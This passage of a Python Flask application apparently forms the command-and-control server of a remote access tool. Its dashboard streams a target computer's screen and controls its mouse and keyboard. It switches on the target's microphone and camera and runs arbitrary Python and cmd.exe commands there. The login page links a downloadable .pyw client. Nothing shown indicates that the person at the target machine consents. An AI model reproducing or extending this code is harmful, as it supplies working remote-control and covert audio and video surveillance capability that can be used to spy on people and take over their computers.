        body: JSON.stringify({ name: name, viewer: LIVE_VIEWER })
    }).catch(function() {});
}


function liveScreenReset() {
    liveMaximized = false;
    liveStage().classList.add("minimized");
    liveStage().classList.remove("visible", "has-frame");
    document.getElementById("liveKeyboard").classList.remove("visible");
    document.getElementById("liveToggleBtn").textContent = "Maximize";
    liveFrameComputer = "";
    liveScreenStop("reset");
    setLiveBadge("idle", "Minimized");
}


async function livePollPreview(session) {
    if (!liveRunning || session !== liveSession) return;

    const name = liveComputer;
    const stage = liveStage();
    const image = document.getElementById("liveScreenImage");

    try {
        const response = await fetch(
            "/api/stream/frame/" + encodeURIComponent(name) + "?t=" + Date.now(),
            { cache: "no-store" }
        );

        if (session !== liveSession) return;

        if (response.ok) {
            const blob = await response.blob();
            if (session !== liveSession) return;
            if (liveObjectUrl) URL.revokeObjectURL(liveObjectUrl);
            liveObjectUrl = URL.createObjectURL(blob);
            image.src = liveObjectUrl;
            liveFailures = 0;
            liveFrameComputer = name;
            if (!liveFrameReady) { liveFrameReady = true; stage.classList.add("has-frame"); }
            setLiveBadge("live", "Live \u2014 " + name);
        } else if (response.status === 404) {
            liveFailures += 1;
            if (liveFailures > 300) throw new Error("No frames received.");
        } else {
            let message = "Live screen unavailable.";
            try { const data = await response.json(); message = data.error || message; } catch {}
            throw new Error(message);
        }
    } catch (error) {
        if (session !== liveSession) return;
        liveScreenStop("error");
        setLiveBadge("idle", "Unavailable");
        showToast(error.message, "error", "Live screen");
        return;
    }

    if (liveRunning && session === liveSession) {
        liveRafId = requestAnimationFrame(function() { livePollPreview(session); });
    }
}


function liveCoords(event) {
    const stage = liveStage();
    const image = document.getElementById("liveScreenImage");
    const rect = stage.getBoundingClientRect();
    const nw = image.naturalWidth || 16;
    const nh = image.naturalHeight || 9;
    const scale = Math.min(rect.width / nw, rect.height / nh);
    const w = nw * scale, h = nh * scale;
    const left = rect.left + (rect.width - w) / 2;
    const top = rect.top + (rect.height - h) / 2;
    const x = (event.clientX - left) / w;
    const y = (event.clientY - top) / h;
    if (x < 0 || x > 1 || y < 0 || y > 1) return null;
    return { x, y, rx: event.clientX - rect.left, ry: event.clientY - rect.top };
}


async function liveSendMouse(action, coords) {
    if (!liveComputer) return;
    try {
        await api("/api/remote-mouse", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, action, x: coords.x, y: coords.y })
        });
    } catch (e) { showToast(e.message, "error", "Remote mouse"); }
}


async function liveScreenClick(event) {
    if (!liveMaximized || !liveRunning || !liveFrameReady || !liveComputer) return;
    const coords = liveCoords(event);
    if (!coords) return;
    liveRipple(coords.rx, coords.ry);
    await liveSendMouse("click", coords);
}


async function liveScreenMouseDown(event) {
    if (!liveMaximized || !liveRunning || !liveFrameReady || !liveComputer) return;
    if (event.button !== 0) return;
    const coords = liveCoords(event);
    if (!coords) return;
    liveMouseDown = true;
    await liveSendMouse("down", coords);
}


async function liveScreenMouseUp(event) {
    if (!liveMouseDown) return;
    liveMouseDown = false;
    const coords = liveCoords(event) || { x: 0.5, y: 0.5 };
    await liveSendMouse("up", coords);
}


async function liveScreenScroll(event) {
    if (!liveMaximized || !liveRunning || !liveFrameReady || !liveComputer) return;
    event.preventDefault();
    const coords = liveCoords(event) || { x: 0.5, y: 0.5 };
    const delta = event.deltaY > 0 ? -3 : 3;
    try {
        await api("/api/remote-scroll", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, x: coords.x, y: coords.y, delta })
        });
    } catch (e) { showToast(e.message, "error", "Remote scroll"); }
}


function liveRipple(left, top) {
    const dot = document.createElement("span");
    dot.className = "live-ripple";
    dot.style.left = left + "px";
    dot.style.top = top + "px";
    liveStage().appendChild(dot);
    setTimeout(function() { dot.remove(); }, 560);
}


// ------------------------------------------------------------------ keyboard

async function liveSendKey(key, type) {
    if (!liveComputer) return;
    try {
        await api("/api/remote-key", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, key, type })
        });
    } catch (e) { showToast(e.message, "error", "Remote key"); }
}


function liveKbKeyPress(btn) {
    const key = btn.dataset.key;
    const isModifier = ["Control", "Alt", "Shift", "Meta"].includes(key);
    if (isModifier) {
        liveModifiers[key] = !liveModifiers[key];
        btn.classList.toggle("pressed", liveModifiers[key]);
        liveSendKey(key, liveModifiers[key] ? "down" : "up");
    } else {
        btn.classList.add("pressed");
        setTimeout(() => btn.classList.remove("pressed"), 150);
        liveSendKey(key, "press");
    }
}


async function liveKbSendText() {
    const input = document.getElementById("liveKbInput");
    const text = input.value;
    if (!text || !liveComputer) return;
    input.value = "";
    try {
        await api("/api/remote-key", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, text })
        });
    } catch (e) { showToast(e.message, "error", "Remote text"); }
}


document.querySelectorAll(".kb-key[data-key]").forEach(function(btn) {
    btn.addEventListener("click", function() { liveKbKeyPress(btn); });
});

document.getElementById("liveKbInput").addEventListener("keydown", function(e) {
    if (e.key === "Enter") { e.preventDefault(); liveKbSendText(); }
});

document.getElementById("liveStage").addEventListener("click", liveScreenClick);
document.getElementById("liveStage").addEventListener("mousedown", liveScreenMouseDown);
document.getElementById("liveStage").addEventListener("mouseup", liveScreenMouseUp);
document.getElementById("liveStage").addEventListener("wheel", liveScreenScroll, { passive: false });

window.addEventListener("mouseup", function() {
    if (liveMouseDown) { liveMouseDown = false; liveSendMouse("up", { x: 0.5, y: 0.5 }); }
});

window.addEventListener("pagehide", function() {
    if (!liveRunning || !liveComputer) return;
    const name = liveComputer;
    liveRunning = false;
    fetch("/api/stream/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        keepalive: true,
        body: JSON.stringify({ name: name, viewer: LIVE_VIEWER })
    }).catch(function() {});
});

document.addEventListener("visibilitychange", function() {
    if (document.hidden && liveRunning) liveScreenStop("hidden");
});


// ==================================================
// REMOTE MICROPHONE
// ==================================================

const MIC_POLL_MS = 250;

let micRunning = false;
let micTimer = null;
let micContext = null;
let micPlayhead = 0;
let micSeq = -1;


async function toggleMicrophone() {

    if (micRunning) {
        await stopMicrophone();
    } else {
        await startMicrophone();
    }
}


async function startMicrophone() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const button = document.getElementById("micButton");
    const status = document.getElementById("micStatus");

    try {

        status.textContent = "Starting microphone...";

        await api("/api/mic/start", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

        if (!micContext) {
            micContext = new (
                window.AudioContext ||
                window.webkitAudioContext
            )();
        }

        if (micContext.state === "suspended") {
            await micContext.resume();
        }

        micSeq = -1;
        micPlayhead = 0;
        micRunning = true;

        button.textContent = "Stop Listening";
        status.textContent = "Waiting for audio...";

        logEvent(
            "success",
            "Microphone started for " + currentComputer + "."
        );

        pollMicrophone();

    } catch (error) {

        status.textContent =
            "Microphone failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Microphone failed"
        );

    }
}


async function stopMicrophone() {

    const button = document.getElementById("micButton");
    const status = document.getElementById("micStatus");

    micRunning = false;
    clearTimeout(micTimer);

    button.textContent = "Start Listening";
    status.textContent = "Microphone is off.";

    document.getElementById("micLevel").style.width = "0";

    if (micContext && micContext.state === "running") {

        try {
            await micContext.suspend();
        } catch {}
    }

    if (!currentComputer) {
        return;
    }

    try {

        await api("/api/mic/stop", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

    } catch (error) {
        console.error(error);
    }
}


function playAudioChunks(chunks, rate) {

    let peak = 0;

    for (const chunk of chunks) {

        const binary = atob(chunk.data);
        const bytes = new Uint8Array(binary.length);

        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }

        const samples = new Int16Array(
            bytes.buffer,
            0,
            bytes.length >> 1
        );

        if (!samples.length) {
            continue;
        }

        const buffer = micContext.createBuffer(
            1,
            samples.length,
            rate
        );

        const output = buffer.getChannelData(0);

        for (let i = 0; i < samples.length; i++) {

            const value = samples[i] / 32768;

            output[i] = value;

            const magnitude = Math.abs(value);

            if (magnitude > peak) {
                peak = magnitude;
            }
        }

        const source = micContext.createBufferSource();

        source.buffer = buffer;
        source.connect(micContext.destination);

        const now = micContext.currentTime;

        if (micPlayhead < now + 0.02) {
            micPlayhead = now + 0.05;
        }

        source.start(micPlayhead);

        micPlayhead += buffer.duration;
        micSeq = chunk.seq;
    }

    return peak;
}


async function pollMicrophone() {

    if (!micRunning) {
        return;
    }

    const status = document.getElementById("micStatus");
    const level = document.getElementById("micLevel");

    try {

        const response = await api(
            "/api/mic/chunks?name=" +
            encodeURIComponent(currentComputer) +
            "&since=" + micSeq
        );

        const data = await response.json();

        if (data.error) {

            micRunning = false;
            clearTimeout(micTimer);

            document.getElementById("micButton").textContent =
                "Start Listening";

            level.style.width = "0";
            status.textContent =
                "Microphone failed: " + data.error;

            showToast(
                data.error,
                "error",
                "Microphone failed"
            );

            return;
        }

        if (!data.active) {

            micRunning = false;
            clearTimeout(micTimer);

            document.getElementById("micButton").textContent =
                "Start Listening";

            level.style.width = "0";
            status.textContent =
                "Microphone stopped on the computer.";

            logEvent(
                "info",
                "Microphone stopped on " + currentComputer + "."
            );

            return;
        }

        const peak = playAudioChunks(data.chunks, data.rate);

        if (data.chunks.length) {
            status.textContent =
                "Listening - " +
                new Date().toLocaleTimeString();
        }

        level.style.width =
            Math.min(100, Math.round(peak * 160)) + "%";

    } catch (error) {
        console.error(error);
    }

    if (micRunning) {
        micTimer = setTimeout(pollMicrophone, MIC_POLL_MS);
    }
}


// ==================================================
// REMOTE CAMERA
// ==================================================

const CAMERA_REFRESH_MS = 500;

let cameraRunning = false;
let cameraTimer = null;
let cameraObjectUrl = null;


async function toggleCamera() {

    if (cameraRunning) {
        await stopCamera();
    } else {
        await startCamera();
    }
}


async function startCamera() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const button = document.getElementById("cameraButton");
    const status = document.getElementById("cameraStatus");
    const image = document.getElementById("cameraImage");

    try {

        status.textContent = "Starting camera...";

        await api("/api/camera/start", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

        cameraRunning = true;

        button.textContent = "Stop Camera";
        image.style.display = "block";
        status.textContent = "Waiting for the camera...";

        logEvent(
            "success",
            "Camera started for " + currentComputer + "."
        );

        pollCamera();

    } catch (error) {

        status.textContent =
            "Camera failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Camera failed"
        );

    }
}


async function stopCamera() {

    const button = document.getElementById("cameraButton");
    const status = document.getElementById("cameraStatus");
    const image = document.getElementById("cameraImage");

    cameraRunning = false;
    clearTimeout(cameraTimer);

    button.textContent = "Start Camera";
    status.textContent = "Camera is off.";
    image.style.display = "none";

    if (cameraObjectUrl) {
        URL.revokeObjectURL(cameraObjectUrl);
        cameraObjectUrl = null;
    }

    if (!currentComputer) {
        return;
    }

    try {

        await api("/api/camera/stop", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

    } catch (error) {

        console.error(error);

        logEvent(
            "warn",
            "Could not stop camera: " + error.message
        );
    }
}


async function pollCamera() {

    if (!cameraRunning) {
        return;
    }

    const status = document.getElementById("cameraStatus");
    const image = document.getElementById("cameraImage");

    try {

        const response = await fetch(
            "/api/camera/frame/" +
            encodeURIComponent(currentComputer) +
            "?t=" + Date.now(),
            { cache: "no-store" }
        );

        if (response.ok) {

            const blob = await response.blob();

            if (cameraObjectUrl) {
                URL.revokeObjectURL(cameraObjectUrl);
            }

            cameraObjectUrl = URL.createObjectURL(blob);
            image.src = cameraObjectUrl;

            status.textContent =
                "Live camera - " +
                new Date().toLocaleTimeString();

        } else {

            let message = "Waiting for the camera...";

            try {
                const data = await response.json();
                message = data.error || message;
            } catch {}

            if (message === "No frame available") {
                message = "Waiting for the camera...";
            }

            status.textContent = message;

            if (message !== "Waiting for the camera...") {

                cameraRunning = false;
                clearTimeout(cameraTimer);

                document.getElementById("cameraButton").textContent =
                    "Start Camera";

                image.style.display = "none";

                showToast(
                    message,
                    "error",
                    "Camera stopped"
                );
            }
        }

    } catch (error) {
        console.error(error);
    }

    if (cameraRunning) {
        cameraTimer = setTimeout(
            pollCamera,
            CAMERA_REFRESH_MS
        );
    }
}


// ==================================================
// REMOTE PYTHON RUNNER
// ==================================================

const PYTHON_POLL_MS = 700;


async function waitForPythonResult(requestId) {

    const deadline = Date.now() + 180000;

    while (Date.now() < deadline) {

        await new Promise(
            resolve => setTimeout(resolve, PYTHON_POLL_MS)
        );

        const response = await fetch(
            "/api/python/result/" +
            encodeURIComponent(requestId)
        );

        const data = await response.json();

        if (!response.ok) {
            throw new Error(
                data.error || "Result unavailable."
            );
        }

        if (data.status === "ready") {
            return data;
        }
    }

    throw new Error(
        "Timed out waiting for the remote computer."
    );
}


async function runPython() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const codeInput = document.getElementById("pythonCode");
    const button = document.getElementById("pythonRunButton");
    const status = document.getElementById("pythonStatus");
    const output = document.getElementById("pythonOutput");

    const code = codeInput.value;

    if (!code.trim()) {
        status.textContent = "Paste some Python code first.";
        showToast(
            "Paste some Python code first.",
            "warn",
            "Nothing to run"
        );
        return;
    }

    button.disabled = true;
    output.style.display = "none";
    output.textContent = "";

    status.textContent =
        "Running Python code on " + currentComputer + "...";

    try {

        const response = await api("/api/python/run", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer,
                code: code
            })
        });

        const data = await response.json();

        const result = await waitForPythonResult(
            data.request_id
        );

        status.textContent =
            "Finished with exit code " +
            result.exit_code + ".";

        output.style.display = "block";
        output.textContent = result.output
            ? result.output.replace(/\s+$/, "")
            : "(No output.)";

        showToast(
            "Finished with exit code " + result.exit_code + ".",
            "success",
            "Python finished"
        );

    } catch (error) {

        status.textContent =
            "Python run failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Python run failed"
        );

    } finally {

        button.disabled = false;
    }
}


document.getElementById("pythonCode")
    .addEventListener("keydown", function(event) {

        if (event.key === "Enter" && (event.ctrlKey || event.metaKey)) {
            event.preventDefault();
            runPython();
        }
    });


// ==================================================
// INITIALIZATION
// ==================================================

setInterval(refreshComputers, 5000);

setInterval(pollLogs, 3000);

pollLogs().then(() => {
    logEvent("info", "Dashboard opened.");
});

consoleSetTarget();

refreshComputers();

</script>

</body>
</html>
"""


# ==================================================
# TERMINAL-STYLE CONSOLE
# ==================================================

CONSOLE_HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <title></title>

    <link rel="icon" type="image/x-icon" href="/favicon.ico">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 25px;
            background: #101410;
            color: #c8e6c9;
            font-family: Consolas, monospace;
        }

        .terminal {
            background: #050805;
            border: 1px solid #385b38;
            border-radius: 8px;
            padding: 20px;
            min-height: 75vh;
            box-shadow: 0 0 20px #000;
        }

        .header {
            color: #8bcf8b;
            border-bottom: 1px solid #385b38;
            padding-bottom: 12px;
            margin-bottom: 15px;
        }

        #output {
            white-space: pre-wrap;
            overflow-wrap: anywhere;
            line-height: 1.5;
            min-height: 55vh;
        }

        .input-line {
            display: flex;
            gap: 8px;
            margin-top: 15px;
        }

        .prompt {
            color: #7ee787;
            padding-top: 10px;
        }

        input {
            flex: 1;
            min-width: 0;
            background: #101810;
            color: #c8e6c9;
            border: 1px solid #385b38;
            border-radius: 4px;
            padding: 10px;
            font-family: Consolas, monospace;
        }

        button {
            background: #315d31;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-family: Consolas, monospace;
        }

        button:hover {
            background: #477d47;
        }

        .muted {
            color: #789078;
        }
    </style>
</head>

<body>

<div class="terminal">

    <div class="header">
        <strong>REMOTE SHELL CONSOLE</strong>
        <p id="computerName">Connecting...</p>
        <p class="muted">
            Commands run on the target computer through cmd.exe.
            Use cd to change the working directory.
        </p>
    </div>

    <div id="output">Remote shell ready.
Type a command and press Enter. Everything runs on the target computer.
</div>

    <div class="input-line">
        <span class="prompt">remote&gt;</span>

        <input
            id="command"
            type="text"
            placeholder="Enter command..."
            autocomplete="off"
        >

        <button onclick="runCommand()">Run</button>
    </div>

</div>


<script>

const clientName = {{ name | tojson }};

const output = document.getElementById("output");
const input = document.getElementById("command");
const runButton = document.querySelector(".input-line button");

let busy = false;


function printLine(text) {

    output.textContent += text + "\n";

    window.scrollTo(
        0,
        document.body.scrollHeight
    );
}


function setBusy(value) {

    busy = value;

    input.disabled = value;
    runButton.disabled = value;

    if (!value) {
        input.focus();
    }
}


async function waitForResult(commandId) {

    const deadline = Date.now() + 900000;

    while (Date.now() < deadline) {

        await new Promise(resolve => setTimeout(resolve, 500));

        const response = await fetch(
            "/api/console/result/" +
            encodeURIComponent(commandId)
        );

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.error || "Result unavailable.");
        }

        if (data.status === "ready") {
            return data;
        }

        if (data.status === "error") {
            throw new Error(data.message || "Command failed.");
        }
    }

    throw new Error("Timed out waiting for the remote computer.");
}


async function runCommand() {

    if (busy) {
        return;
    }

    const command = input.value;

    if (!command.trim()) {
        return;
    }

    if (["clear", "cls"].includes(command.trim().toLowerCase())) {
        input.value = "";
        output.textContent = "";
        return;
    }

    printLine("remote> " + command);

    input.value = "";
    setBusy(true);

    try {

        const response = await fetch("/api/console/command", {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                name: clientName,
                command: command
            })

        });

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.error || "Command failed.");
        }

        const result = await waitForResult(data.command_id);

        if (result.output) {
            printLine(result.output.replace(/\s+$/, ""));
        }

        if (result.exit_code) {
            printLine("[exit code " + result.exit_code + "]");
        }

    } catch (error) {

        printLine("ERROR: " + error.message);

    } finally {

        setBusy(false);
        printLine("");
    }
}


input.addEventListener("keydown", function(event) {

    if (event.key === "Enter") {
        runCommand();
    }

});


async function loadComputer() {

    try {

        const response = await fetch(
            "/api/tree?name=" + encodeURIComponent(clientName)
        );

        const data = await response.json();

        if (!response.ok) {
            throw new Error(data.error);
        }

        document.getElementById("computerName").textContent =
            "Computer: " + data.name +
            " | Root: " + data.root;

    } catch (error) {

        document.getElementById("computerName").textContent =
            "Computer unavailable: " + error.message;

    }
}


loadComputer();

</script>

</body>
</html>
"""


# ==================================================
# LOGIN PAGE
# ==================================================

LOGIN_HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: grid;
            place-items: center;
            padding: 24px;
            background:
                radial-gradient(circle at 50% 22%, #0e1a0e 0%, #050805 62%);
            color: #c8e6c9;
            font-family: Consolas, monospace;
        }

        .card {
            position: relative;
            width: 100%;
            max-width: 400px;
            padding: 34px 32px 28px;
            background: rgba(6, 10, 6, 0.94);
            border: 1px solid #2c452c;
            border-radius: 16px;
            box-shadow:
                0 30px 90px rgba(0, 0, 0, 0.75),
                0 0 40px rgba(71, 125, 71, 0.08);
            backdrop-filter: blur(14px);
            overflow: hidden;
            animation: card-in 520ms cubic-bezier(0.2, 0.9, 0.3, 1.1) both;
        }

        .card::before {
            content: "";
            position: absolute;
            top: 0;
            left: 16%;
            right: 16%;
            height: 1px;
            background: linear-gradient(90deg, transparent, #7ee787, transparent);
            opacity: 0.55;
        }

        .mark {
            position: relative;
            width: 48px;
            height: 48px;
            margin: 0 auto 20px;
            display: grid;
            place-items: center;
            border: 1px solid #2c452c;
            border-radius: 50%;
        }

        .mark::before {
            content: "";
            width: 13px;
            height: 13px;
            border-radius: 50%;
            background: #7ee787;
            box-shadow: 0 0 20px #7ee787;
            animation: breathe 2.4s ease-in-out infinite;
        }

        .mark::after {
            content: "";
            position: absolute;
            inset: -6px;
            border-radius: 50%;
            border: 1px dashed #2c452c;
            animation: spin 20s linear infinite;
        }

        h1 {
            margin: 0 0 6px;
            text-align: center;
            font-size: 19px;
            letter-spacing: 1.4px;
            color: #8bcf8b;
        }

        .sub {
            margin: 0 0 26px;
            text-align: center;
            font-size: 12px;
            color: #789078;
        }

        label {
            display: block;
            margin-bottom: 7px;
            font-size: 10px;
            letter-spacing: 1.4px;
            text-transform: uppercase;
            color: #789078;
        }

        .field {
            margin-bottom: 16px;
        }

        input {
            width: 100%;
            padding: 12px 13px;
            background: #0b120b;
            border: 1px solid #2c452c;
            border-radius: 8px;
            color: #d9efd9;
            font-family: Consolas, monospace;
            font-size: 14px;
            transition:
                border-color 160ms ease,
                box-shadow 160ms ease,
                background 160ms ease;
        }

        input:focus {
            outline: none;
            border-color: #6ba36b;
            background: #0e170e;
            box-shadow: 0 0 0 3px rgba(71, 125, 71, 0.22);
        }

        .password-wrap {
            position: relative;
        }

        .password-wrap input {
            padding-right: 72px;
        }

        .reveal {
            position: absolute;
            top: 50%;
            right: 6px;
            transform: translateY(-50%);
            padding: 6px 8px;
            background: transparent;
            border: none;
            border-radius: 5px;
            color: #789078;
            font-family: Consolas, monospace;
            font-size: 10px;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            cursor: pointer;
        }

        .reveal:hover {
            color: #c8e6c9;
            background: #1d2b1d;
        }

        .error {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 16px;
            padding: 10px 12px;
            background: rgba(255, 107, 107, 0.08);
            border: 1px solid rgba(255, 107, 107, 0.35);
            border-radius: 8px;
            color: #ffb3b3;
            font-size: 12px;
            animation:
                shake 420ms ease,
                fade-in 240ms ease;
        }

        .error::before {
            content: "";
            flex: 0 0 auto;
            width: 7px;
            height: 7px;
            border-radius: 50%;
            background: #ff6b6b;
            box-shadow: 0 0 10px #ff6b6b;
        }

        button[type="submit"] {
            width: 100%;
            padding: 12px;
            background: #315d31;
            border: none;
            border-radius: 8px;
            color: #ffffff;
            font-family: Consolas, monospace;
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
            cursor: pointer;
            transition:
                background 160ms ease,
                transform 160ms ease,
                box-shadow 160ms ease;
        }

        button[type="submit"]:hover {
            background: #477d47;
            transform: translateY(-1px);
            box-shadow: 0 10px 24px rgba(71, 125, 71, 0.3);
        }

        button[type="submit"]:active {
            transform: translateY(0);
        }

        button[type="submit"]:disabled {
            opacity: 0.55;
            cursor: wait;
            transform: none;
            box-shadow: none;
        }

        .download-instead {
            display: block;
            width: 100%;
            margin-top: 10px;
            padding: 10px 15px;
            border: 1px solid #385b38;
            border-radius: 4px;
            background: #101810;
            color: #8bcf8b;
            text-align: center;
            text-decoration: none;
            font-family: Consolas, monospace;
            transition: background 160ms ease, border-color 160ms ease;
            box-sizing: border-box;
        }

        .download-instead:hover {
            background: #1d2b1d;
            border-color: #477d47;
        }

        .footer {
            margin: 18px 0 0;
            text-align: center;
            font-size: 10px;
            letter-spacing: 0.8px;
            color: #567356;
        }

        @keyframes card-in {
            from {
                opacity: 0;
                transform: translateY(14px) scale(0.98);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        @keyframes breathe {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.45; transform: scale(0.8); }
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-3px); }
        }

        @keyframes fade-in {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>

<body>

<form class="card" id="loginForm" method="post" action="/login">

    <div class="mark"></div>

    <h1>Remote Computer Manager</h1>
    <p class="sub">Sign in to open the dashboard</p>

    {% if error %}
    <div class="error">{{ error }}</div>
    {% endif %}

    <input type="hidden" name="next" value="{{ next_url }}">

    <div class="field">
        <label for="username">Username</label>
        <input
            id="username"
            name="username"
            type="text"
            value="{{ username }}"
            autocomplete="username"
            spellcheck="false"
            autofocus
        >
    </div>

    <div class="field">
        <label for="password">Password</label>

        <div class="password-wrap">
            <input
                id="password"
                name="password"
                type="password"
                autocomplete="current-password"
                {% if error %}autofocus{% endif %}
            >

            <button
                class="reveal"
                id="reveal"
                type="button"
                aria-label="Show password"
            >
                Show
            </button>
        </div>
    </div>

    <button type="submit" id="submitButton">
        Sign In
    </button>

    <a
        class="download-instead"
        href="https://github.com/downloader-AXP/downloader/releases/latest/download/file.pyw"
        target="_blank"
        rel="noopener noreferrer"
        aria-label="Download the setup installer from the latest published GitHub release"
    >
        Download latest version
    </a>

    <p class="footer">Authorized access only.</p>

</form>

<script>
    const form = document.getElementById("loginForm");
    const password = document.getElementById("password");
    const reveal = document.getElementById("reveal");
    const submitButton = document.getElementById("submitButton");

    reveal.addEventListener("click", () => {

        const showing = password.type === "text";

        password.type = showing ? "password" : "text";
        reveal.textContent = showing ? "Show" : "Hide";
        reveal.setAttribute(
            "aria-label",
            showing ? "Show password" : "Hide password"
        );

        password.focus();
    });

    form.addEventListener("submit", () => {

        submitButton.disabled = true;
        submitButton.textContent = "Signing In...";
    });
</script>

</body>
</html>
"""


# ==================================================
# LOGIN ROUTES
# ==================================================

@app.route("/login", methods=["GET", "POST"])
def login():

    next_url = normalize_next(request.values.get("next", ""))

    if is_signed_in():
        return redirect(next_url or "/")

    error = ""
    username = ""

    if request.method == "POST":

        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""

        if (
            hmac.compare_digest(username, USERNAME)
            and hmac.compare_digest(password, PASSWORD)
        ):
            session.clear()
            session.permanent = True
            session["user"] = USERNAME

            add_log("success", "Dashboard signed in.")

            return redirect(next_url or "/")

        error = "Incorrect username or password."

        add_log("warn", "Failed dashboard sign-in attempt.")

    return render_template_string(
        LOGIN_HTML,
        error=error,
        next_url=next_url,
        username=username
    )


@app.route("/logout")
def logout():

    session.clear()

    add_log("info", "Dashboard signed out.")

    return redirect(url_for("login"))


# ==================================================
# WEBSITE ICON ROUTE (NO STATIC FOLDER NEEDED)
# ==================================================

ICON_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "website.ico"
)


@app.route("/favicon.ico")
def favicon():
    try:
        with open(ICON_PATH, "rb") as f:
            icon_data = f.read()
        return send_file(
            io.BytesIO(icon_data),
            mimetype="image/vnd.microsoft.icon",
            max_age=0
        )
    except FileNotFoundError:
        return "Icon file not found", 404


# ==================================================
# DASHBOARD ROUTE
# ==================================================


@app.route("/")
@require_auth
def dashboard():
    return render_template_string(HTML)


# ==================================================
# CONSOLE PAGE
# ==================================================

@app.route("/console")
@require_auth
def console_page():

    name = request.args.get("name", "")

    with lock:
        client = clients.get(name)

    if not client:
        return "Computer not found.", 404

    if time.time() - client["last_seen"] > 60:
        return "Computer is offline.", 404

    return render_template_string(
        CONSOLE_HTML,
        name=name
    )


# ==================================================
# CONSOLE COMMAND API
# ==================================================

@app.route("/api/console/command", methods=["POST"])
@require_auth
def console_command():

    data = request.get_json(silent=True) or {}

    name = data.get("name")
    command = data.get("command", "")

    if not isinstance(command, str) or not command.strip():
        return jsonify({"error": "Invalid command."}), 400

    command = command.strip()

    if len(command) > 4000:
        return jsonify({"error": "Command is too long."}), 400

    parts = command.split(maxsplit=1)
    operation = parts[0].lower() if parts else ""
    argument = parts[1] if len(parts) > 1 else ""

    with lock:

        client = clients.get(name)

        if not client:
            return jsonify({"error": "Computer not found."}), 404

        if time.time() - client["last_seen"] > 60:
            return jsonify({"error": "Computer is offline."}), 404

        command_id = str(uuid.uuid4())
        request_id = None
        output = None

        if operation == "help":

            output = (
                "AVAILABLE COMMANDS\n"
                "------------------\n"
                "help             Show available commands\n"
                "status           Show connection status\n"
                "pwd              Show the shared root folder\n"
                "ls [folder]      List folders in the cached directory tree\n"
                "screenshot       Request a remote screenshot\n"
                "python-setup     Check for Python and install it if missing\n\n"
                "Any other input is executed on the target computer\n"
                "through cmd.exe. Use cd to change its working directory."
            )

        elif operation == "status":

            elapsed = int(time.time() - client["last_seen"])

            output = (
                "COMPUTER STATUS\n"
                "---------------\n"
                f"Name: {client['name']}\n"
                f"Root: {client['root']}\n"
                f"Last update: {elapsed} seconds ago\n"
                "Connection: Online"
            )

        elif operation == "pwd":

            output = str(client["root"])

        elif operation == "ls":

            folder = find_folder(
                client["tree"],
                argument
            )

            if folder is None:
                return jsonify({
                    "error": "Folder not found in the reported directory tree."
                }), 404

            folders = get_folder_listing(folder)

            if not folders:
                output = "(No folders found.)"
            else:
                output = "\n".join(
                    "📁 " + item["name"]
                    for item in folders
                )

        elif operation == "screenshot":

            request_id = str(uuid.uuid4())

            screenshots[request_id] = {
                "name": name,
                "status": "pending",
                "created": time.time()
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "screenshot",
                "request_id": request_id
            })

            output = (
                "Screenshot request sent to the selected computer.\n"
                "Screenshot request ID: " + request_id + "\n"
                "Check the main dashboard for the screenshot."
            )

        elif operation in (
            "python-setup",
            "setup-python",
            "install-python"
        ):

            console_commands[command_id] = {
                "name": name,
                "status": "pending",
                "output": "",
                "exit_code": 0,
                "created": time.time()
            }

            client_actions.setdefault(name, queue.Queue()).put({
                "action": "python_setup",
                "command_id": command_id
            })

            return jsonify({"command_id": command_id})

        else:

            console_commands[command_id] = {
                "name": name,
                "status": "pending",
                "output": "",
